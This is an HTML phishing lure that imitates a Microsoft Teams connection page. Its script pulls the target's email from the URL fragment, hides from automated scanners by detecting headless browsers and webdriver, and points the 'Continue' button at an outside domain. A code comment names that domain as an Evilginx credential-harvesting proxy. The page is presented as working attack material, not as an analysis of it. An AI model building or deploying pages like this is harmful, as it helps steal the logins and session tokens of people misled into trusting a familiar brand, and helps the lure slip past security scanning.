<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connecting...</title>
</head>
<body>
<h2>Connecting to Microsoft Teams...</h2>
<button class="teams-button">Continue</button>

<script>
window.addEventListener('load', function() {
  const hash = window.location.hash;
  const email = hash ? hash.substring(1) : '';

  // Anti-bot / honey-pot check
  const token = document.getElementById('teams-verification-token')?.value;
  const honey = document.getElementById('teams-honey-field')?.value;
  if (!token || honey) return;

  // Headless detection
  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) return;

  // Update button to go to Evilginx
  const button = document.querySelector('.teams-button');
  if (button) {
    const baseURL = 'https://access-meetings.visions-solutions.ca/OFcNokky';
    button.onclick = function() {
      if (email && email.includes('@')) {
        window.location.href = baseURL + '#' + email;
      } else {
        window.location.href = baseURL;
      }
    };
  }
});
</script>
</body>
</html>
